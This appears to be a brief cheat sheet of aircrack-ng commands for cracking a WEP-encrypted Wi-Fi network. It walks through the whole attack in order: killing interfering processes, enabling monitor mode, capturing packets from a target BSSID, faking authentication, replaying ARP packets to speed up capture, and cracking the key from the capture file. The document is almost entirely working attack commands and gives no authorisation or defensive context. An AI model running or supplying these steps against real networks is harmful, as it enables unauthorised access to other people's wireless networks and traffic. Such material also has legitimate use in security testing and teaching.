### No replay-defense -  crypto is weak - can be cracked fast when at least 20 K packets captured
```
airmon-ng check
airmon-ng check kill
airmon-ng start <interface>
airodump-ng <interface> --bssid <bssid> --channel <channel> --write <file>
```

### -1 for fake authentication
```
aireplay-ng -1 0 -a <bssid> <interface>
```

### Replay arp packages to speed up traffic
```
aireplay-ng <interface> --arpreplay -b <bssid>
```

### Crack password
```
aircrack-ng <file>.cap
```

